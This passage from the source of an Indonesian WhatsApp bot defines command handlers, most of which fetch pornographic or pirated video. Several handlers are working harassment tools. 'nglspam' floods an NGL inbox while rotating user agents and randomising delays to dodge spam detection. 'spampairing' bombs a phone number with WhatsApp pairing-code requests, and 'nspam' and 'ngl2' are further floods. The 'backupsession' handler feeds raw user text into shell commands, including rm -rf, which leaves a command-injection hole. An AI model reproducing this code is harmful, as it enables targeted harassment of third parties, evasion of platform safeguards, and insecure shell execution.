    if (!text) return m.reply("Contoh penggunaan:\n.animesearch <keyword>");

    m.reply("⏳ Sedang mencari data anime...");
    try {
        // Panggil API dengan keyword & apikey
        let url = `https://rest.api-otakuwibu.my.id/api/nsfw/nhsearch?q=${encodeURIComponent(text)}&apikey=mysu`;
        let res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

        let json = await res.json();
        // Pastikan respons memiliki status=200
        if (json.status !== 200) {
            return m.reply(`❌ Gagal. status: ${json.status}\nDev: ${json.dev || 'Tidak diketahui.'}\nData tidak tersedia.`);
        }

        // Cek apakah data tersedia
        if (!json.data || json.data.length === 0) {
            return m.reply("❌ Tidak ada hasil pencarian untuk kata kunci tersebut.");
        }

        // Susun teks hasil pencarian
        let hasil = `*Hasil Pencarian Anime*\n\n`;
        json.data.forEach((item, i) => {
            // item: { id, title, thumbnail, ... }
            hasil += `${i + 1}. *ID:* ${item.id}\n   *Title:* ${item.title}\n   *Thumbnail:* ${item.thumbnail}\n\n`;
        });
        hasil += `Total hasil: ${json.data.length}.\n`;

        m.reply(hasil);
    } catch (err) {
        console.error("Error animesearch:", err);
        m.reply("❌ Terjadi kesalahan saat mencari data anime.");
    }
}
break
case 'nhentaidl': {
if (!isOwner) return m.reply(mess.owner);
const PDFDocument = require('pdfkit')
function toPDF(images, opt = {}) {
	return new Promise(async (resolve, reject) => {
		if (!Array.isArray(images)) images = [images]
		let buffs = [], doc = new PDFDocument({ margin: 0, size: 'A4' })
		for (let x = 0; x < images.length; x++) {
			if (/.webp|.gif/.test(images[x])) continue
			let data = (await axios.get(images[x], { responseType: 'arraybuffer', ...opt })).data
			doc.image(data, 0, 0, { fit: [595.28, 841.89], align: 'center', valign: 'center' })
			if (images.length != x + 1) doc.addPage()
		}
		doc.on('data', (chunk) => buffs.push(chunk))
		doc.on('end', () => resolve(Buffer.concat(buffs)))
		doc.on('error', (err) => reject(err))
		doc.end()
	})
}
if (!text) return reply(`*Example*: ${ prefix + command } kodenya?`)
try {
await Izz.sendMessage(m.chat, { react: { text: "🍃", key: m.key } });
let data = await( await fetch(`https://rest.api-otakuwibu.my.id/api/nsfw/nhdetail?id=${text}&apikey=mysu`)).json()
let imagepdf = await toPDF(data.data.media)		
let txt = `${data.data.title}\n\n`
  txt += `> *Artists:* ${data.data.artists}\n`
  txt += `> *Pages:* ${data.data.pages}\n`
  txt += `> *Bahasa:* ${data.data.languages}\n`
    txt += `> *Tags:* _${data.data.tags}_`
await Izz.sendMessage(m.chat, { document: imagepdf, fileName: data.data.title + '.pdf', mimetype: 'application/pdf', caption: txt }, { quoted: m })
     } catch (e) {
     console.log(e)
     m.reply(e)
  }
} 
break
case 'xnxxsearch': {
if (!isOwner) return m.reply(mess.owner);
    if (!text) return m.reply("Contoh penggunaan:\n.xnxxsearch <keyword>");

    m.reply("⏳ Sedang mencari video...");
    try {
        // Panggil API dengan keyword
        let url = `https://archive-ui.tanakadomp.biz.id/search/xnxx?q=${encodeURIComponent(text)}`;
        let res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

        let json = await res.json();
        // Struktur:
        // {
        //   "status": true,
        //   "creator": "TanakaDomp",
        //   "result": [
        //     { "title": "...", "info": "...", "link": "..." },
        //     ...
        //   ]
        // }

        // Pastikan status true
        if (!json.status) {
            return m.reply(`❌ Gagal. status: ${json.status}\nCreator: ${json.creator || 'Tidak diketahui.'}\nData tidak tersedia.`);
        }

        // Cek apakah result ada
        if (!json.result || json.result.length === 0) {
            return m.reply("❌ Tidak ada hasil pencarian untuk kata kunci tersebut.");
        }

        // Susun teks hasil pencarian
        let hasil = `*Hasil Pencarian Video*\n\n`;
        json.result.forEach((item, i) => {
            // item: { title, info, link }
            hasil += `${i + 1}. *Title:* ${item.title}\n`;
            if (item.info) hasil += `   *Info:* ${item.info}\n`;
            if (item.link) hasil += `   *Link:* ${item.link}\n`;
            hasil += '\n';
        });
        hasil += `Total hasil: ${json.result.length} *untuk mendownload videonya .xnxxdown <link>.\n`;

        m.reply(hasil);
    } catch (err) {
        console.error("Error xnxxsearch:", err);
        m.reply("❌ Terjadi kesalahan saat mencari video.");
    }
}
break
case 'xnxxdown': {
if (!isOwner) return m.reply(mess.owner);
    if (!text) return m.reply("Contoh penggunaan:\n.viddown <link_xnxx>");

    m.reply("⏳ Sedang memproses link...");
    try {
        // Memanggil API dengan parameter url
        let url = `https://archive-ui.tanakadomp.biz.id/download/xnxx?url=${encodeURIComponent(text)}`;
        let res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

        let json = await res.json();
        // Pastikan status === true
        if (!json.status) {
            return m.reply(`❌ Gagal. status: ${json.status}\nCreator: ${json.creator || 'Tidak diketahui.'}\nData tidak tersedia.`);
        }

        // Ekstrak data result
        let { title, image, info, files } = json.result || {};
        if (!files) {
            return m.reply("❌ Data 'files' tidak ditemukan.");
        }

        // Pilih link video (bisa 'high', 'low', dsb.)
        let videoLink = files.high || files.low;
        if (!videoLink) {
            return m.reply("❌ Link video tidak ditemukan di 'files'.");
        }

        // Susun caption
        let caption = `*XNXX Video Download*\n\n` +
                      `• *Title:* ${title}\n` +
                      `• *Info:* ${info}\n` +
                      `• *Link:* ${text}\n`;

        // Kirim Thumbnail + Info (opsional)
        await Izz.sendMessage(m.chat, {
            image: { url: image },
            caption
        }, { quoted: m });

        // Kirim Video
        await Izz.sendMessage(m.chat, {
            video: { url: videoLink },
            caption: `🎥 ${title}`,
            mimetype: 'video/mp4'
        }, { quoted: m });

        m.reply("✅ Video berhasil dikirim!");
    } catch (err) {
        console.error("Error viddown:", err);
        m.reply("❌ Terjadi kesalahan saat memproses link video.");
    }
}
break
case 'ngl2': case 'ngl-spam': {
if (!isOwner) return m.reply(`khusus owner`);

      let input = text.split('|');
    if (!input[0] || !input[1] || !input[2]) return m.reply("Masukkan username, jumlah pesan, dan pesannya!\nContoh: .ngl2 khaerul|15|haii");
      try {
             let username = input[0];
             let total = parseInt(input[1]);
             let message = input[2];
             
             var { data } = await require('axios')({
            "method": "GET",
            "url": `https://api.zenkey.my.id/api/other/nglspam?username=${username}&message=${message}&total=${total}&apikey=zenkey`
     });
       if (data.status === true) {
        m.reply(data.result);
} else {
m.reply("Gagal mengirim NGL: " + (data.result || "Pastikan API Key benar dan parameter sesuai."));
}
} catch (e) {
return m.reply("Fitur error: " + e.message);
}
}
break
case 'videy': {
if (!isOwner) return m.reply(mess.owner);
    // Pastikan user memasukkan link
    if (!text) return m.reply("Contoh penggunaan:\n.videy <link_video>");

    m.reply("⏳ Sedang memproses link...");
    try {
        // Memanggil API
        let url = `https://archive-ui.tanakadomp.biz.id/download/videy?url=${encodeURIComponent(text)}`;
        let res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

        let json = await res.json();
        // Struktur respons:
        // {
        //   "status": true,
        //   "creator": "TanakaDomp",
        //   "result": "Gghhh.mp4" // link download mp4
        // }

        if (!json.status) {
            return m.reply(`❌ Gagal. status: ${json.status}\nCreator: ${json.creator || 'Tidak diketahui.'}`);
        }

        // result = link video mp4
        let videoLink = json.result;
        if (!videoLink) {
            return m.reply("❌ Link video tidak ditemukan di respons API.");
        }

        // Kirim video
        await Izz.sendMessage(m.chat, {
            video: { url: videoLink },
            caption: `*Video Downloaded*\nLink: ${text}\nBy: ${json.creator || 'TanakaDomp'}`,
            mimetype: 'video/mp4'
        }, { quoted: m });

        m.reply("✅ Video berhasil dikirim!");
    } catch (err) {
        console.error("Error videy:", err);
        m.reply("❌ Terjadi kesalahan saat memproses link video.");
    }
}
break
case 'nekopoisearch': {
if (!isOwner) return m.reply(mess.owner);
    if (!text) return m.reply("Contoh: .nekopoisearch <keyword>");
    m.reply("🔎 Mencari data di Nekopoi...");

    // Gunakan require
    
    
    // Fungsi searchNekopoi di dalam case
    async function searchNekopoi(keyword) {
        try {
            const url = `https://nekopoi.care/?s=${encodeURIComponent(keyword)}`;
            const res = await fetch(url);
            if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

            const html = await res.text();
            const $ = cheerio.load(html);

            let results = [];
            // Sesuaikan selector sesuai struktur Nekopoi terkini
            $('div.result-left > div.result-item').each((i, el) => {
                let title = $(el).find('h2 a').text().trim();
                let link = $(el).find('h2 a').attr('href');
                if (title && link) {
                    results.push({ title, link });
                }
            });
            return results;
        } catch (err) {
            console.error('Error searchNekopoi:', err);
            return [];
        }
    }

    // Panggil fungsi searchNekopoi
    let results = await searchNekopoi(text);
    if (results.length === 0) {
        return m.reply("❌ Tidak ada hasil pencarian untuk kata kunci tersebut.");
    }

    let msg = `*Hasil Pencarian Nekopoi*\n\n`;
    results.forEach((item, i) => {
        msg += `${i + 1}. *Title:* ${item.title}\n   *Link:* ${item.link}\n\n`;
    });
    msg += `Total: ${results.length}.\n`;

    m.reply(msg);
}
break;

case 'nekopoidownload': {
if (!isOwner) return m.reply(mess.owner);
    if (!text) return m.reply("Contoh: .nekopoidownload <link_detail>");
    m.reply("⏳ Mengambil link download...");

    // Gunakan require
    const fetch = require('node-fetch');
    
    // Fungsi getDownloadLinks di dalam case
    async function getDownloadLinks(detailUrl) {
        try {
            const res = await fetch(detailUrl);
            if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

            const html = await res.text();
            const $ = cheerio.load(html);

            let downloads = [];
            // Sesuaikan selector link download
            $('div.liner > a[target="_blank"]').each((i, el) => {
                let link = $(el).attr('href');
                let text = $(el).text().trim();
                if (link) {
                    downloads.push({ text, link });
                }
            });
            return downloads;
        } catch (err) {
            console.error('Error getDownloadLinks:', err);
            return [];
        }
    }

    // Panggil fungsi getDownloadLinks
    let downloads = await getDownloadLinks(text);
    if (downloads.length === 0) {
        return m.reply("❌ Tidak ditemukan link download di halaman tersebut.");
    }

    let msg = `*Link Download dari Nekopoi*\n\n`;
    downloads.forEach((item, i) => {
        msg += `${i + 1}. [${item.text}] ${item.link}\n`;
    });
    msg += `\nSilakan pilih link yang tersedia.`;

    m.reply(msg);
}
break
case 'cosplayrandom': {
if (!isOwner) return m.reply(mess.owner);
    m.reply("⏳ Sedang mengambil foto cosplay...");
    try {

        await Izz.sendMessage(m.chat, {
            image: { url: `https://www.archive-ui.biz.id/asupan/cosplay` },
            caption: "Berikut foto cosplay random untuk Anda."
        }, { quoted: m });
      m.reply("✅ Foto cosplay berhasil dikirim!");
    } catch (err) {
        console.error("Error cosplayrandom:", err);
        m.reply("❌ Terjadi kesalahan saat mengambil foto cosplay.");
    }
}
break
case 'hentaisearch': {
if (!isOwner) return m.reply(mess.owner);
    if (!text) return m.reply(`Contoh penggunaan:\n.hentaisearch <keyword>`);

    m.reply("⏳ Sedang mencari data kartun...");
    try {
        // Memanggil API dengan parameter q
        let url = `https://api.agungny.my.id/api/hentai?q=${encodeURIComponent(text)}`;
        let res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

        let json = await res.json();
        // Pastikan status = "true"
        if (json.status !== "true") {
            return m.reply(`❌ Gagal. status: ${json.status}\nCreator: ${json.creator || 'Tidak diketahui.'}\nData tidak tersedia.`);
        }

        // Cek apakah result ada
        if (!json.result || json.result.length === 0) {
            return m.reply("❌ Tidak ada hasil pencarian untuk kata kunci tersebut.");
        }

        // Susun teks hasil pencarian
        let hasil = `*Hasil Pencarian Kartun*\n\n`;
        // Boleh batasi misal 5 item saja, di sini contohnya 10
        let maxItems = Math.min(json.result.length, 10);
        for (let i = 0; i < maxItems; i++) {
            let item = json.result[i];
            // item: { title, link, category, share_count, views_count, type, video_1, video_2 }
            hasil += `${i + 1}. *Title:* ${item.title}\n`;
            hasil += `   *Link:* ${item.link}\n`;
            if (item.category) hasil += `   *Category:* ${item.category}\n`;
            if (item.share_count) hasil += `   *Share Count:* ${item.share_count}\n`;
            if (item.views_count) hasil += `   *Views Count:* ${item.views_count}\n`;
            if (item.type) hasil += `   *Type:* ${item.type}\n`;
            if (item.video_1) hasil += `   *Video 1:* ${item.video_1}\n`;
            if (item.video_2) hasil += `   *Video 2:* ${item.video_2}\n`;
            hasil += '\n';
        }

        hasil += `Total hasil: ${json.result.length}.\n`;
        m.reply(hasil);
    } catch (err) {
        console.error("Error kartunsearch:", err);
        m.reply("❌ Terjadi kesalahan saat mencari data kartun.");
    }
}
break
case 'hentaidown': {
if (!isOwner) return m.reply(mess.owner);
if (!text) return m.reply(`Masukkan Link Video 1 atau 2`);
m.reply(`*WAIT PROSES*`);
await Izz.sendMessage(m.chat, {
            video: { url: text },
            caption: `🎥 Inilah Hasil Videonya🗿`,
            mimetype: 'video/mp4'
        }, { quoted: m });
        }
        break
        case 'samehadakusearch': {
    if (!text) return m.reply(`Contoh penggunaan:\n.samehadakusearch dr-stone`);

    m.reply("⏳ Sedang memproses pencarian...");
    try {
        // Membentuk link detail
        // Misalnya: ...?link=https://samehadaku.email/anime/dr-stone
        let url = `https://api.siputzx.my.id/api/animesamehadaku/detail?link=https://samehadaku.email/anime/${encodeURIComponent(text)}`;
        let res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

        let json = await res.json();
        // Struktur:
        // {
        //   "status": true,
        //   "data": {
        //     "title": "Nonton Anime Dr. Stone",
        //     "thumbnail": "...",
        //     "published": "...",
        //     "rating": "8.45/10",
        //     "description": "...",
        //     "genres": [...],
        //     "episodes": [
        //       { "title": "...", "date": "...", "link": "..." },
        //       ...
        //     ]
        //   }
        // }

        // Cek status
        if (!json.status) {
            return m.reply(`❌ Gagal. status: ${json.status}\nData tidak tersedia.`);
        }

        // Ekstrak data
        let { title, thumbnail, published, rating, description, genres, episodes } = json.data || {};
        if (!title) {
            return m.reply("❌ Data anime tidak ditemukan atau link salah.");
        }

        // Susun teks
        let hasil = `*Samehadaku Search*\n\n`;
        hasil += `• *Judul:* ${title}\n`;
        hasil += `\n*Daftar Episode:*\n`;
        if (episodes && episodes.length > 0) {
            episodes.forEach((ep, i) => {
                hasil += `${i + 1}. ${ep.title}\n   Tanggal: ${ep.date}\n   Link: ${ep.link}\n\n`;
            });
        } else {
            hasil += "   (Tidak ada episode)\n";
        }

        // Kirim thumbnail + info
        await Izz.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: hasil
        }, { quoted: m });

    } catch (err) {
        console.error("Error samehadakusearch:", err);
        m.reply("❌ Terjadi kesalahan saat mengambil data dari Samehadaku.");
    }
}
break
case 'samehadakudown': {
    if (!text) return m.reply("Contoh penggunaan:\n.samehadakudown <link_samehadaku>\n\nContoh link:\nhttps://samehadaku.email/blue-lock-episode-20/");

    m.reply("⏳ Sedang memproses link video...");
    try {
        // Panggil API
        let apiUrl = `https://api.siputzx.my.id/api/anime/samehadaku/download?url=${encodeURIComponent(text)}`;
        let res = await fetch(apiUrl);
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

        let json = await res.json();
        // Struktur respons:
        // {
        //   "status": true,
        //   "data": {
        //     "title": "...",
        //     "link": "...",
        //     "downloads": [
        //       { "name": "...", "link": "..." },
        //       ...
        //     ]
        //   }
        // }

        // Pastikan status == true
        if (!json.status) {
            return m.reply(`❌ Gagal. status: ${json.status}\nData tidak tersedia.`);
        }

        let { title, link, downloads } = json.data || {};
        if (!downloads || downloads.length < 2) {
            // Jika downloads tidak memiliki elemen ke-4
            return m.reply("❌ Tidak ditemukan link Premium 1080p (elemen ke-4) di respons API.");
        }

        // Pilih elemen ke-4 (index 3)
        let chosenDownload = downloads[1];
        if (!chosenDownload.link) {
            return m.reply("❌ Link kosong di item ke-4 (Premium 1080p).");
        }

        let videoLink = chosenDownload.link;
        let sourceName = chosenDownload.name || "Unknown";

        // Susun caption
        let caption = `*Samehadaku Download*\n\n` +
                      `• *Title:* ${title || 'No Title'}\n` +
                      `• *Original Link:* ${link || 'Tidak ada'}\n` +
                      `• *Selected Source:* ${sourceName}\n\n` +
                      `_Mengirim video..._`;

        // Kirim info terlebih dahulu
        await Izz.sendMessage(m.chat, { text: caption }, { quoted: m });

        // Kirim video
        await Izz.sendMessage(m.chat, {
            video: { url: videoLink },
            caption: `*${title || 'No Title'}*\nSource: ${sourceName}`,
            mimetype: 'video/mp4'
        }, { quoted: m });

        m.reply("✅ Video berhasil dikirim!");
    } catch (err) {
        console.error("Error samehadakudown:", err);
        m.reply("❌ Terjadi kesalahan saat memproses link video dari Samehadaku.");
    }
}
break
case 'tesapi': {
let izzlink = `https://pixeldrain.com/api/file/F5nHYDif`
await Izz.sendMessage(m.chat, {
            video: { url: izzlink },
            caption: `*Result*`,
            mimetype: 'video/mp4'
        }, { quoted: m });
        }
        break
        case 'nspam': {
        if (!isOwner) return m.reply(`only Owner`);
        if (!text) return m.reply(`enter number`);
        try {
         m.reply(`\n`.repeat(text));
        } catch (e) {
        console.log(e);
        m.reply(e);
        }
        }
        break
        case 'ailuminai': {
    if (!text) return m.reply(`Halo 🖐 Saya Adalah Luminai ai apakah ada yang ingin ditanyakan ?`);

    Izz.sendMessage(m.chat, { react: { text: `⌛`, key: m.key }})
    try {
        let url = `https://www.archive-ui.biz.id/ai/luminai?text=${encodeURIComponent(text)}`;
        let res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

        let json = await res.json();

        if (!json.status) {
            return m.reply(`❌ Gagal. status: ${json.status}\nCreator: ${json.creator || 'Tidak diketahui.'}`);
        }


        let aiResponse = json.result;
        if (!aiResponse) {
            return m.reply("❌ Tidak ada respons AI yang ditemukan.");
        }


        m.reply(aiResponse);

    } catch (err) {
        console.error("Error ailuminai:", err);
        m.reply("❌ Terjadi kesalahan saat memproses permintaan AI.");
    }
}
break
case 'kayes': {
if (!isOwner) return
Izz.sendMessage(m.chat, { react: { text: `⌛`, key: m.key}})
let url = `https://api.nasirxml.my.id/asupan/kayes`;
let res = await fetch(url)
if (!res.ok) throw new Error(`Http Error! Status ${res.status}`);
let json = await res.json();

if (!json.status) return m.reply(`Error Status tidak on`);

if (!json.result) return m.reply(`Error Tidak Ditemukan Result`);
try {
await Izz.sendMessage(m.chat, {
            video: { url: json.result },
            caption: `🎥 Inilah Hasil Videonya🗿`,
            mimetype: 'video/mp4'
        }, { quoted: m });
        } catch (e) {
        m.reply(e)
        console.log(e)
        }
        }
        break
        case 'hentaipart2':{
        if (!isOwner) return
        m.reply(`⌛`);
        try {
        let url = `https://api.nasirxml.my.id/dewasa/blowjob`;
        await Izz.sendMessage(m.chat, {
            video: { url: url },
            caption: `🎥 Inilah Hasil Videonya🗿`,
            mimetype: 'video/mp4'
        }, { quoted: m });
        } catch (e) {
        m.reply(e)
        console.log(e)
        }
        }
        break
        case 'tagswv2': {
        if (!isOwner) return m.reply(mess.owner);
    if (!text) return m.reply(
        "Format salah!\nContoh:\n.tagsw <pesan>, <jid_grup>, <jid_grup>, <jid_privat>\n\n" +
        "Contoh balas media:\n.tagsw <pesan>, <jid_grup>, <jid_privat>"
    );

    // Pisahkan input berdasarkan koma
    let parts = text.split(",").map(v => v.trim());
    // Bagian pertama: pesan/caption
    let message = parts[0];
    // Sisanya: daftar JID
    let jids = parts.slice(1).filter(j => j.endsWith("@g.us") || j.endsWith("@s.whatsapp.net"));

    if (!jids.length) {
        return m.reply("Minimal sertakan 1 JID (grup atau privat) setelah teks.\nContoh: .tagsw Halo, 1203630xxx@g.us");
    }

    // Tentukan media yang akan diunggah (image/video/audio/teks)
    let media = null;
    let options = {};

    if (quoted) {
        const mime = quoted.mtype || quoted.mediaType || "";
        // Unduh file media jika reply
        

        if (mime.includes("image")) {
            options = {
                image: media,
                caption: message || quoted.text || ''
            };
        } else if (mime.includes("video")) {
            options = {
                video: media,
                caption: message || quoted.text || ''
            };
        } else if (mime.includes("audio")) {
            options = {
                audio: media,
                mimetype: "audio/mp4", // atau "audio/mpeg"
                ptt: false,            // true jika ingin voice note
                caption: message || quoted.text || ''
            };
        } else {
            // Jika bukan image/video/audio, fallback teks
            options = {
                text: message || quoted.text || ''
            };
        }
    } else {
        // Jika tidak reply media, hanya teks
        options = {
            text: message
        };
    }

    try {
        // Mengunggah status ke beberapa JID menggunakan StatusMentions
await Izz.sendStatusMentions(options, jids)
        m.reply(`✅ Berhasil mengunggah status mention ke ${jids.length} JID!\nPesan: ${message}`);
    } catch (err) {
        console.error("Error tagsw:", err);
        m.reply("❌ Terjadi kesalahan saat mengunggah status mention.");
    }
}
break
case 'tagswinvis': {
    // Hanya Owner/Bot (opsional, sesuaikan)
    if (!isOwner && !isBot) return m.reply("Perintah ini hanya untuk Owner atau Bot.");

    // Memastikan ada input
    if (!text) {
        return m.reply(`Format salah!\nContoh:\n.tagsw <caption>, <group_jid>, <group_jid>, ...\n\n` +
                       `Contoh reply media:\n(tagsw) <caption>, <group_jid>, <group_jid>`);
    }

    // Pisahkan input berdasarkan koma
    let parts = text.split(",").map(v => v.trim());
    // Bagian pertama: caption
    let caption = parts[0];
    // Sisanya: daftar JID grup
    let groupJids = parts.slice(1).filter(j => j.endsWith("@g.us"));

    if (!groupJids.length) {
        return m.reply("Minimal sertakan 1 JID grup setelah teks. Contoh:\n.tagsw Halo, 1203630xxx@g.us");
    }

    // Cek media (image/video/audio/teks)
    let media = null;
    let options = {};

    if (quoted) {
        const mime = quoted.mtype || quoted.mediaType || "";
        // Unduh media jika reply
       

        if (mime.includes("image")) {
            options = {
                image: media,
                caption: caption || quoted.text || '',
            };
        } else if (mime.includes("video")) {
            options = {
                video: media,
                caption: caption || quoted.text || '',
            };
        } else if (mime.includes("audio")) {
            options = {
                audio: media,
                mimetype: "audio/mp4", // atau "audio/mpeg"
                ptt: false,            // true jika ingin voice note
                caption: caption || quoted.text || ''
            };
        } else {
            // Jika bukan image/video/audio, fallback teks
            options = {
                text: caption || quoted.text || ''
            };
        }
    } else {
        // Jika tidak reply media, hanya teks
        options = {
            text: caption
        };
    }

    try {
        let totalGroups = groupJids.length;

        // Proses setiap grup
            // Ambil daftar member grup
            let groupMeta = await Izz.groupMetadata(groupJids);
            let participants = groupMeta.participants.map(p => p.id);

            // Kirim ke status@broadcast dengan mention semua member
            // Satu status untuk satu grup
            await Izz.sendMessage("status@broadcast", options, {
                backgroundColor: "#7ACAA7",
                textArgb: 0xffffffff,
                font: 1,
                statusJidList: participants, // mention ke seluruh member
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: participants.map(pid => ({
                                    tag: "to",
                                    attrs: { jid: groupJids },
                                    content: undefined,
                                })),
                            },
                        ],
                    },
                ],
            });
        

        // Beri konfirmasi
        m.reply(`✅ Berhasil membuat status mention untuk *${totalGroups}* grup!\nTotal member.`);
    } catch (err) {
        console.error("Error tagsw:", err);
        m.reply("❌ Terjadi kesalahan saat mengirim status.");
    }
}
break
case 'tesfiturbro':{
if (!isOwner) return m.reply(mess.owner);
await Izz.sendMessage(
   m.chat, 
   { 
       event: {
           isCanceled: false, // or true for cancel event 
           name: "Name Event", 
           description: "Description Event",
           location: { 
               degressLatitude: -99999, 
               degressLongitude: - 99999999 
           },
           link: "Call Link",
           startTime: m.messageTimestamp.low,
           endTime: m.messageTimestamp.low + 86400, // 86400 is day in seconds
           extraGuestsAllowed: true
       }
   },
   { quoted : m }
)
}
break
case 'backupsession': {
 
    const ownerNumber = '6281274749995'; // Nomor owner utama yang tidak akan dihapus

    // Pastikan hanya owner utama yang dapat menjalankan case ini
    if (m.sender.split('@')[0] !== ownerNumber) {
        reply("Hanya owner utama yang dapat menjalankan perintah ini.");
        return;
    }
 if (!isOwner) return m.reply(mess.owner)
 if (!text) return m.reply(`\n\n*Format Salah*\nSilahkan Masukkan .*backup* nama file\n\n`);
 await m.reply("Sabar Mas Lagi Backup!!!");
 const { execSync } = require("child_process");
 const ls = (await execSync("ls"))
 .toString()
 .split("\n")
 .filter(
 (pe) =>
 pe != "node_modules" &&
 pe != "karzsession" &&
 pe != "package-lock.json" &&
 pe != "yarn.lock" &&
 pe != "izz.js" &&
 pe != "IzzWangsapRun.js" &&
 pe != "kece.mp3" &&
 pe != "lagu.mp3" &&
 pe != "Readme.Md" &&
 pe != "package.json" &&
 pe != "settings.js" &&
 pe != "thumb.png" &&
 pe != "gif.mp4" &&
 pe != "temp" &&
 pe != "save" &&
 pe != "lib" &&
 pe != "all" &&
 pe != ""
 );
 const exec = await execSync(`zip -r ${text}.zip ${ls.join(" ")}`);
 await Izz.sendMessage(
 m.chat,
 {
 document: await fs.readFileSync(`./${text}.zip`),
 mimetype: "application/zip",
 fileName: `${text}.zip`,
 },
 { quoted: qchanel }
 );
 await execSync(`rm -rf ${text}.zip`);
 }
 break
 case 'spampairing': {
 if (!isOwner) return m.reply(mess.owner);
    if (!text) return m.reply(`Contoh penggunaan:\n.spampairing <nomor> <jumlah>\n\nMisal:\n.spampairing 6281234567890 5`);
    
    // Pisahkan input: nomor & count
    let [phoneNumber, countStr] = text.trim().split(/\s+/);
    if (!phoneNumber || !countStr) {
        return m.reply(`Format salah!\nContoh: .spampairing 6281234567890 5`);
    }

    let count = parseInt(countStr);
    if (isNaN(count) || count <= 0) {
        return m.reply(`Jumlah spam pairing harus berupa angka > 0.\nContoh: .spampairing 6281234567890 5`);
    }

    m.reply(`⏳ Sedang memulai spam pairing code ke nomor: ${phoneNumber}\nTotal spam: ${count}`);

    for (let i = 0; i < count; i++) {
        try {
            let code = await Izz.requestPairingCode(phoneNumber);
            // Format code: misal pecah jadi xxxx-xxxx
            if (code) {
                let splitted = code.match(/.{1,4}/g)?.join("-");
                code = splitted || code;
            }
            
            // Kirim feedback ke chat
            await m.reply(
                `✅ Berhasil request pairing code!\n` +
                `• Nomor  : ${phoneNumber}\n` +
                `• Attempt: [${i + 1}/${count}]\n` +
                `• Code   : ${code || '(tidak ditemukan)'}`
            );
        } catch (err) {
            console.error("Error spampairing:", err.message);
            await m.reply(`❌ Gagal attempt ke-[${i + 1}]. Error: ${err.message}`);
        }
    }

    // Setelah selesai
    m.reply(`Selesai spam pairing ke ${phoneNumber} sebanyak ${count} kali.\nJika ingin keluar, ketik perintah lain atau ctrl+c (terminal).`);
}
break
case 'ssweb': {
if (!isOwner) return m.reply(mess.owner);
    if (!args[0]) return m.reply('Berikan Url Web Nya\n\n*Example :* .ssweb https://www.nasa.gov ');

    try {
        let result = await Screenshot(args[0]);

        await Izz.sendMessage(m.chat, { 
            image: result.buffer
        }, { quoted: m });
    } catch (e) {
        m.reply('Error');
    }
    }
    break
// Case di dalam switch-case command
case 'nglspam': {
    if (!text) return m.reply("Contoh penggunaan:\n.nglspam <username>|<pesan>|<jumlah>");
    
    let parts = text.split("|");
    if (parts.length < 3) return m.reply("Format salah. Contoh: .nglspam izz19810|halo|100");
    
    let username = parts[0].trim();
    let message = parts[1].trim();
    let totalCount = parseInt(parts[2].trim());
    
    if (isNaN(totalCount) || totalCount <= 0) return m.reply("Jumlah harus berupa angka lebih besar dari 0.");
    
    m.reply(`⏳ Mulai mengirim spam NGL sebanyak ${totalCount} pesan...`);

    const crypto = require("crypto");
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    
    let counter = 0;
    let deviceId = crypto.randomBytes(21).toString("hex"); // Device ID tetap per sesi

    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/537.36"
    ];

    (async () => {
        while (counter < totalCount) {
            try {
                const date = new Date();
                const formattedDate = `${date.getHours()}:${date.getMinutes()}`;

                const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

                const url = "https://ngl.link/api/submit";
                const headers = {
                    "User-Agent": randomUserAgent,
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "Referer": `https://ngl.link/${username}`,
                    "Origin": "https://ngl.link"
                };

                const body = `username=${username}&question=${encodeURIComponent(message)}&deviceId=${deviceId}&gameSlug=&referrer=`;

                const response = await fetch(url, {
                    method: "POST",
                    headers,
                    body,
                    mode: "cors",
                    credentials: "include"
                });

                if (response.status === 429) {
                    console.log(`[${formattedDate}] ❌ Rate Limited! Menunggu 30 detik...`);
                    await sleep(30000);
                    continue; // Coba lagi setelah delay
                }

                if (!response.ok) {
                    console.log(`[${formattedDate}] ❌ Error ${response.status}, menunggu 15 detik...`);
                    await sleep(15000);
                    continue;
                }

                counter++;
                console.log(`[${formattedDate}] ✅ Pesan Terkirim (${counter}/${totalCount})`);
                
                // Random sleep untuk menghindari pola spam yang mencurigakan
                let delay = Math.floor(Math.random() * (5000 - 2000 + 1) + 2000); // 2-5 detik
                await sleep(delay);

            } catch (error) {
                console.error(`⚠️ Error: ${error.message}`);
                await sleep(5000);
            }
        }
        console.log(`🎉 Selesai mengirim ${totalCount} pesan.`);
    })();
}
break
case 'adddb': {
if (!isOwner) return m.reply(mess.owner);
